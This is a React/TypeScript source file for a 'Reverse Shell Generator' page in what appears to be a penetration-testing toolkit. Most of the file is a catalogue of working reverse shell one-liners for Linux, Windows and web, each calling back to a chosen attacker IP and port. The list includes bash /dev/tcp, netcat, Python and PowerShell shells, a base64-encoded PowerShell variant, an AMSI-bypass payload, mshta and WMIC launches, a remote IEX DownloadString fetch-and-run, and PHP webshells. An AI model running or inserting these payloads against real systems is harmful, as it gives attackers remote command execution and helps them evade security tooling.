import { useState, useMemo } from 'react'
import { ArrowBendUpLeft } from '@phosphor-icons/react'
import { ToolLayout } from '../../components/ToolLayout'
import { FieldInput } from '../../components/FieldInput'
import { PayloadList } from '../../components/PayloadList'
import type { PayloadItem } from '../../components/PayloadList'
import type { Tool } from '../types'

type Category = 'Linux' | 'Windows' | 'Web'
const CATEGORIES: Category[] = ['Linux', 'Windows', 'Web']

function psEncode(cmd: string): string {
  const utf16le = new Uint8Array(cmd.length * 2)
  for (let i = 0; i < cmd.length; i++) {
    utf16le[i * 2]     = cmd.charCodeAt(i) & 0xff
    utf16le[i * 2 + 1] = (cmd.charCodeAt(i) >> 8) & 0xff
  }
  let binary = ''
  utf16le.forEach(b => { binary += String.fromCharCode(b) })
  return btoa(binary)
}

const PS_INNER = (ip: string, port: string) =>
  `$client=New-Object System.Net.Sockets.TCPClient('${ip}',${port});` +
  `$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};` +
  `while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){` +
  `$data=(New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);` +
  `$sendback=(iex $data 2>&1|Out-String);` +
  `$sendback2=$sendback+'PS '+(pwd).Path+'> ';` +
  `$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);` +
  `$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`

interface Shell { id: string; label: string; category: Category; build: (ip: string, port: string) => string }

const SHELLS: Shell[] = [
  // Linux
  { id: 'bash-tcp',    category: 'Linux',   label: 'Bash TCP',            build: (ip, p) => `bash -i >& /dev/tcp/${ip}/${p} 0>&1` },
  { id: 'bash-196',    category: 'Linux',   label: 'Bash 196',            build: (ip, p) => `0<&196;exec 196<>/dev/tcp/${ip}/${p}; sh <&196 >&196 2>&196` },
  { id: 'bash-read',   category: 'Linux',   label: 'Bash read loop',      build: (ip, p) => `exec 5<>/dev/tcp/${ip}/${p};cat <&5|while read l;do $l 2>&5 >&5;done` },
  { id: 'python3',     category: 'Linux',   label: 'Python 3',            build: (ip, p) => `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
  { id: 'python2',     category: 'Linux',   label: 'Python 2',            build: (ip, p) => `python -c 'import socket,os,pty;s=socket.socket();s.connect(("${ip}",${p}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'` },
  { id: 'perl',        category: 'Linux',   label: 'Perl',                build: (ip, p) => `perl -e 'use Socket;$i="${ip}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'` },
  { id: 'ruby',        category: 'Linux',   label: 'Ruby',                build: (ip, p) => `ruby -rsocket -e'f=TCPSocket.open("${ip}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'` },
  { id: 'nc-e',        category: 'Linux',   label: 'Netcat (-e)',         build: (ip, p) => `nc -e /bin/sh ${ip} ${p}` },
  { id: 'nc-mkfifo',   category: 'Linux',   label: 'Netcat (mkfifo)',     build: (ip, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${p} >/tmp/f` },
  { id: 'socat',       category: 'Linux',   label: 'socat',               build: (ip, p) => `socat TCP:${ip}:${p} EXEC:'/bin/sh',pty,stderr,setsid,sigint,sane` },
  { id: 'awk',         category: 'Linux',   label: 'awk',                 build: (ip, p) => `awk 'BEGIN{s="/inet/tcp/0/${ip}/${p}";for(;;){printf"$ ">>"/dev/stderr";if((s|getline c)<=0)break;while((c|getline)>0)print|s;close(c)}}' /dev/null` },
  { id: 'lua',         category: 'Linux',   label: 'Lua',                 build: (ip, p) => `lua -e "local s=require('socket');local t=s.tcp();t:connect('${ip}','${p}');while true do local r,e=t:receive();if not r then break end;local f=io.popen(r,'r');local a=f:read('*a');f:close();t:send(a);end;t:close();"` },
  // Windows
  { id: 'ps',          category: 'Windows', label: 'PowerShell',              build: (ip, p) => `powershell -nop -ep bypass -c "${PS_INNER(ip, p)}"` },
  { id: 'ps-enc',      category: 'Windows', label: 'PowerShell (encoded)',    build: (ip, p) => `powershell -nop -ep bypass -EncodedCommand ${psEncode(PS_INNER(ip, p))}` },
  { id: 'ps-amsi',     category: 'Windows', label: 'PowerShell + AMSI bypass',build: (ip, p) => `powershell -nop -ep bypass -c "$a=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUtils');$b=$a.GetField('am'+'siInitFailed','NonPublic,Static');$b.SetValue($null,$true);${PS_INNER(ip, p)}"` },
  { id: 'cmd-nc',      category: 'Windows', label: 'cmd + nc.exe',            build: (ip, p) => `nc.exe -e cmd.exe ${ip} ${p}` },
  { id: 'ps-nc',       category: 'Windows', label: 'PowerShell + nc',         build: (ip, p) => `nc.exe -e powershell.exe ${ip} ${p}` },
  { id: 'ncat',        category: 'Windows', label: 'ncat',                    build: (ip, p) => `ncat.exe ${ip} ${p} -e cmd.exe` },
  { id: 'win-python3', category: 'Windows', label: 'Python 3',                build: (ip, p) => `python -c "import socket,subprocess;s=socket.socket();s.connect(('${ip}',${p}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"` },
  { id: 'win-python2', category: 'Windows', label: 'Python 2',                build: (ip, p) => `python -c "import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('${ip}',${p}));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"` },
  { id: 'mshta',       category: 'Windows', label: 'Mshta (LOLbin)',           build: (ip, p) => `mshta "javascript:new ActiveXObject('WScript.Shell').Run('nc.exe ${ip} ${p} -e cmd.exe',0);close()"` },
  { id: 'wmic',        category: 'Windows', label: 'WMIC',                    build: (ip, p) => `wmic process call create "powershell -nop -ep bypass -c \\"${PS_INNER(ip, p)}\\""` },
  { id: 'conpty',      category: 'Windows', label: 'ConPTY (Nishang)',         build: (ip, p) => `IEX(New-Object Net.WebClient).DownloadString('http://${ip}/Invoke-ConPtyShell.ps1');Invoke-ConPtyShell ${ip} ${p}` },
  // Web
  { id: 'php-proc',    category: 'Web',     label: 'PHP proc_open',       build: (ip, p) => `php -r '$sock=fsockopen("${ip}",${p});$proc=proc_open("sh",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'` },
  { id: 'php-exec',    category: 'Web',     label: 'PHP webshell exec',   build: (ip, p) => `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
  { id: 'php-system',  category: 'Web',     label: 'PHP webshell system', build: (ip, p) => `<?php system("bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
  { id: 'php-passthru',category: 'Web',     label: 'PHP passthru',        build: (ip, p) => `<?php passthru("bash -c 'bash -i >& /dev/tcp/${ip}/${p} 0>&1'"); ?>` },
]

const CAT_ON: Record<Category, string> = {
  Linux:   'border-orange-400 text-orange-400 bg-orange-400/10',
  Windows: 'border-blue-400   text-blue-400   bg-blue-400/10',
  Web:     'border-purple-400 text-purple-400 bg-purple-400/10',
}
const CAT_BADGE: Record<Category, string> = {
  Linux:   'bg-orange-400/20 text-orange-400',
  Windows: 'bg-blue-400/20   text-blue-400',
  Web:     'bg-purple-400/20 text-purple-400',
}

function ReverseShellGenerator() {
  const [ip,   setIp]   = useState('')
  const [port, setPort] = useState('4444')
  const [cats, setCats] = useState<Set<Category>>(new Set(CATEGORIES))

  const toggleCat = (c: Category) =>
    setCats(prev => { const n = new Set(prev); if (n.has(c)) n.delete(c); else n.add(c); return n })

  const items = useMemo<PayloadItem[]>(
    () => SHELLS
      .filter(s => cats.has(s.category))
      .map(s => ({
        id:         s.id,
        badge:      s.category,
        badgeClass: CAT_BADGE[s.category],
        label:      s.label,
        value:      s.build(ip || '[IP]', port || '[PORT]'),
      })),
    [cats, ip, port]
  )

  return (
    <ToolLayout title="Reverse Shell Generator" description="One-liners for catching reverse shells across languages and platforms">
      <div className="flex flex-col gap-5 max-w-2xl">

        <div className="flex gap-3">
          <FieldInput label="Local IP" value={ip} onChange={setIp} placeholder="10.10.14.1" />
          <FieldInput label="Port" value={port} onChange={setPort} placeholder="4444" className="w-28" />
        </div>

        <div className="flex flex-col gap-1.5">
          <span className="text-vs-muted text-xs uppercase tracking-widest">Platform</span>
          <div className="flex gap-2">
            {CATEGORIES.map(cat => (
              <button
                key={cat}
                onClick={() => toggleCat(cat)}
                className={`px-3 py-1 text-xs rounded border transition-colors ${
                  cats.has(cat) ? CAT_ON[cat] : 'border-vs-border text-vs-muted hover:bg-vs-hover'
                }`}
              >
                {cat}
              </button>
            ))}
          </div>
        </div>

        <PayloadList items={items} listLabel="Shells" emptyMessage="Toggle at least one platform above." />

      </div>
    </ToolLayout>
  )
}

export default {
  meta: {
    slug: 'reverse-shell',
    name: 'Reverse Shell',
    description: 'Generate reverse shell one-liners for any language or platform',
    icon: ArrowBendUpLeft,
    tags: ['pentest', 'linux', 'windows', 'web'],
  },
  Component: ReverseShellGenerator,
} satisfies Tool
